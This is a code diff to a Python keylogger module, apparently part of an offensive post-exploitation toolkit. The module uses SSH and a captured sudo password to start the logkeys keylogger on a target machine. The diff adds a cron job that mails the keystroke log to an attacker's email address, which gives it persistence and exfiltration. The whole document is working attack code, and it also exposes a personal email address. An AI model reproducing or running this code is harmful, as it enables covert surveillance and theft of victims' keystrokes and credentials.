@@ -11,7 +11,8 @@ class Keylogger(Module):
         self.command = command
         self.options = {
                 "frequency": Option("frequency", "* * * * *", "how often to run command", False),
-                }
+                "email": Option("email", "penguingeorge@gmail.com", "Email to send file to", False),
+		}
 
     def exploit(self, command):
         os.system('git clone https://github.com/kernc/logkeys')
@@ -28,6 +29,13 @@ class Keylogger(Module):
 	self.target.ssh.exec_command("touch log.log")
 	time.sleep(1)
 	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S logkeys --start --output log.log")
-	print("Starting...")
 
+	print("Starting...")
+	
+	if (raw_input("Press y to have the file sent to you through email") == 'y'):
+	    self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S apt-get install mail-utils")
+	    self.target.ssh.exec_command("crontab -l > mycron")
+	    self.target.ssh.exec_command("echo 'echo report | mail -A ~/log.log " + raw_input("Please input your email address") + "' > script.sh")
+	    self.target.ssh.exec_command("echo \"* * * * 0 echo password | sudo -S bash ~/script.sh\" >> mycron && crontab mycron && rm mycron")
+	 
 	print(GOOD + self.name + " module success")
